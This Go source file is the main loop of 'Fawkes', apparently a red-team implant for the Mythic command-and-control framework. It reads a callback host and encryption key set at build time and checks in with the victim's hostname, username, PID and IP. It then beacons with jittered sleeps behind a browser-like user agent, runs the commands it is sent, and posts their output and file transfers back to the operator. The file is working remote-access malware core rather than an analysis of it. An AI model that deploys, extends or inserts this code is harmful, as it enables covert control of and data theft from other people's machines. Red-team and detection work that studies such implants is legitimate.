package main

import (
	"context"
	"encoding/json"
	"fmt"
	"log"
	"math/rand"
	"os"
	"os/signal"
	"strconv"
	"strings"
	"syscall"
	"time"

	"github.com/google/uuid"

	"fawkes/pkg/commands"
	"fawkes/pkg/files"
	"fawkes/pkg/http"
	"fawkes/pkg/profiles"
	"fawkes/pkg/structs"
)

var (
	// These variables are populated at build time by the Go linker
	payloadUUID   string = ""
	c2Profile     string = ""
	callbackHost  string = ""
	callbackPort  string = "443"
	userAgent     string = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
	sleepInterval string = "10"
	jitter        string = "10"
	encryptionKey string = ""
	killDate      string = "0"
	maxRetries    string = "10"
	debug         string = "false"
	getURI        string = "/data"
	postURI       string = "/data"
)

func main() {
	runAgent()
}

func runAgent() {
	// Convert string build variables to appropriate types
	callbackPortInt, _ := strconv.Atoi(callbackPort)
	sleepIntervalInt, _ := strconv.Atoi(sleepInterval)
	jitterInt, _ := strconv.Atoi(jitter)
	killDateInt64, _ := strconv.ParseInt(killDate, 10, 64)
	maxRetriesInt, _ := strconv.Atoi(maxRetries)
	debugBool, _ := strconv.ParseBool(debug)

	// Setup logging
	if debugBool {
		log.SetOutput(os.Stdout)
		// log.Println("[DEBUG] Starting Fawkes agent")
	}

	// Verify required configuration
	if payloadUUID == "" {
		payloadUUID = uuid.New().String()
		log.Printf("[WARNING] No payload UUID provided, generated: %s", payloadUUID)
	}

	// Check kill date
	if killDateInt64 > 0 && time.Now().Unix() > killDateInt64 {
		log.Printf("[INFO] Agent past kill date, exiting")
		os.Exit(0)
	}

	// Initialize the agent
	agent := &structs.Agent{
		PayloadUUID:   payloadUUID,
		Architecture:  "x64", // This should be set at build time
		Domain:        "",
		ExternalIP:    "",
		Host:          getHostname(),
		Integrity:     3,
		InternalIP:    getInternalIP(),
		OS:            getOperatingSystem(),
		PID:           os.Getpid(),
		ProcessName:   os.Args[0],
		SleepInterval: sleepIntervalInt,
		Jitter:        jitterInt,
		User:          getUsername(),
		Description:   fmt.Sprintf("Fawkes agent %s", payloadUUID[:8]),
	}

	// Initialize HTTP profile
	// Construct callback URL properly - check if callbackHost already has protocol
	var callbackURL string
	if strings.HasPrefix(callbackHost, "http://") || strings.HasPrefix(callbackHost, "https://") {
		callbackURL = fmt.Sprintf("%s:%d", callbackHost, callbackPortInt)
	} else {
		callbackURL = fmt.Sprintf("http://%s:%d", callbackHost, callbackPortInt)
	}

	httpProfile := http.NewHTTPProfile(
		callbackURL,
		userAgent,
		encryptionKey,
		maxRetriesInt,
		sleepIntervalInt,
		jitterInt,
		debugBool,
		getURI,
		postURI,
	)

	// Initialize C2 profile
	c2 := profiles.NewProfile(httpProfile)

	// Initialize command handlers
	commands.Initialize()

	// Initialize file transfer goroutines
	files.Initialize()

	// Initial checkin
	log.Printf("[INFO] Starting initial checkin...")
	if err := c2.Checkin(agent); err != nil {
		log.Printf("[ERROR] Initial checkin failed: %v", err)
		return
	}
	log.Printf("[INFO] Initial checkin successful")

	// Create context for graceful shutdown
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	// Handle signals for graceful shutdown
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)

	go func() {
		sig := <-sigChan
		log.Printf("[INFO] Received signal: %v, shutting down gracefully", sig)
		cancel()
	}()

	// Start main execution loop
	go mainLoop(ctx, agent, c2, maxRetriesInt, sleepIntervalInt, debugBool)

	// Wait for shutdown signal
	<-ctx.Done()
	log.Printf("[INFO] Fawkes agent shutdown complete")
}

func mainLoop(ctx context.Context, agent *structs.Agent, c2 profiles.Profile, maxRetriesInt int, sleepIntervalInt int, debugBool bool) {
	log.Printf("[INFO] Starting main execution loop for agent %s", agent.PayloadUUID[:8])

	// Main execution loop
	retryCount := 0
	for {
		select {
		case <-ctx.Done():
			log.Printf("[INFO] Context cancelled, exiting main loop")
			return
		default:
			if debugBool {
				// log.Printf(\"[DEBUG] Main loop iteration (retry count: %d)\", retryCount)
			}
			// Get tasks from C2 server
			tasks, err := c2.GetTasking(agent)
			if err != nil {
				log.Printf("[ERROR] Failed to get tasking: %v", err)
				retryCount++
				if retryCount >= maxRetriesInt {
					log.Printf("[ERROR] Maximum retry count reached, resetting counter and sleeping longer")
					retryCount = 0 // Reset counter instead of exiting
					// Sleep longer on repeated failures
					sleepTime := time.Duration(agent.SleepInterval*3) * time.Second
					if debugBool {
						// log.Printf("[DEBUG] Sleeping for extended time %v after max retries", sleepTime)
					}
					time.Sleep(sleepTime)
					continue
				}
				// Use the same sleep calculation for error case
				sleepTime := calculateSleepTime(agent.SleepInterval, agent.Jitter)
				if debugBool {
					// log.Printf(\"[DEBUG] Sleeping for %v after error\", sleepTime)
				}
				time.Sleep(sleepTime)
				continue
			}

			// Reset retry count on successful communication
			retryCount = 0
			if debugBool {
				// log.Printf("[DEBUG] GetTasking successful, received %d tasks", len(tasks))
			}

			// Process tasks
			for _, task := range tasks {
				processTaskWithAgent(task, agent, c2)
			}

			// Sleep before next iteration
			sleepTime := calculateSleepTime(agent.SleepInterval, agent.Jitter)
			if debugBool {
				// log.Printf("[DEBUG] Sleeping for %v before next check", sleepTime)
			}
			time.Sleep(sleepTime)
		}
	}
}

func processTaskWithAgent(task structs.Task, agent *structs.Agent, c2 profiles.Profile) {
	log.Printf("[INFO] Processing task: %s (ID: %s)", task.Command, task.ID)

	// Create Job struct with channels for this task
	job := &structs.Job{
		Stop:              new(int),
		SendResponses:     make(chan structs.Response, 100),
		SendFileToMythic:  files.SendToMythicChannel,
		GetFileFromMythic: files.GetFromMythicChannel,
		FileTransfers:     make(map[string]chan json.RawMessage),
	}
	task.Job = job

	// Start goroutine to forward responses from the job to Mythic
	done := make(chan bool)
	go func() {
		for {
			select {
			case resp := <-job.SendResponses:
				mythicResp, err := c2.PostResponse(resp, agent)
				if err != nil {
					log.Printf("[ERROR] Failed to post file transfer response: %v", err)
					continue
				}

				// If this is a file transfer response, route Mythic's response back
				if len(mythicResp) > 0 && (resp.Upload != nil || resp.Download != nil) {
					// Parse the response to get tracking info
					var responseData map[string]interface{}
					if err := json.Unmarshal(mythicResp, &responseData); err == nil {
						// Look for responses array
						if responses, ok := responseData["responses"].([]interface{}); ok && len(responses) > 0 {
							if firstResp, ok := responses[0].(map[string]interface{}); ok {
								// Send this response to all active file transfer channels
								respJSON, _ := json.Marshal(firstResp)
								for _, ch := range job.FileTransfers {
									select {
									case ch <- json.RawMessage(respJSON):
									case <-time.After(100 * time.Millisecond):
										// Channel timeout, skip
									}
								}
							}
						}
					}
				}
			case <-done:
				// Drain any remaining responses
				for {
					select {
					case resp := <-job.SendResponses:
						_, err := c2.PostResponse(resp, agent)
						if err != nil {
							log.Printf("[ERROR] Failed to post file transfer response: %v", err)
						}
					default:
						return
					}
				}
			}
		}
	}()

	// Get command handler
	handler := commands.GetCommand(task.Command)
	if handler == nil {
		response := structs.Response{
			TaskID:     task.ID,
			Status:     "error",
			UserOutput: fmt.Sprintf("Unknown command: %s", task.Command),
			Completed:  true,
		}
		if _, err := c2.PostResponse(response, agent); err != nil {
			log.Printf("[ERROR] Failed to post response: %v", err)
		}
		close(done)
		return
	}

	// Execute command
	var result structs.CommandResult
	if agentHandler, ok := handler.(structs.AgentCommand); ok {
		result = agentHandler.ExecuteWithAgent(task, agent)
	} else {
		result = handler.Execute(task)
	}

	// Send final response
	response := structs.Response{
		TaskID:     task.ID,
		UserOutput: result.Output,
		Status:     result.Status,
		Completed:  result.Completed,
	}
	if _, err := c2.PostResponse(response, agent); err != nil {
		log.Printf("[ERROR] Failed to post response: %v", err)
	}

	// Signal the response forwarder to finish
	close(done)
	time.Sleep(100 * time.Millisecond) // Give it time to drain
}

func calculateSleepTime(interval, jitter int) time.Duration {
	if jitter == 0 {
		return time.Duration(interval) * time.Second
	}

	// Freyja-style jitter calculation
	// Jitter is a percentage (0-100) that creates variation around the interval
	jitterFloat := float64(rand.Int()%jitter) / float64(100)
	jitterDiff := float64(interval) * jitterFloat

	// Randomly add or subtract jitter (50/50 chance)
	if rand.Int()%2 == 0 {
		// Add jitter
		actualInterval := interval + int(jitterDiff)
		return time.Duration(actualInterval) * time.Second
	} else {
		// Subtract jitter
		actualInterval := interval - int(jitterDiff)
		if actualInterval < 1 {
			actualInterval = 1 // Minimum 1 second
		}
		return time.Duration(actualInterval) * time.Second
	}
}

// Helper functions for system information
func getHostname() string {
	if hostname, err := os.Hostname(); err == nil {
		return hostname
	}
	return "unknown"
}

func getUsername() string {
	if user := os.Getenv("USER"); user != "" {
		return user
	}
	if user := os.Getenv("USERNAME"); user != "" {
		return user
	}
	return "unknown"
}

func getOperatingSystem() string {
	return fmt.Sprintf("%s", os.Getenv("GOOS"))
}

func getInternalIP() string {
	// This is simplified - should implement proper IP detection
	return "127.0.0.1"
}
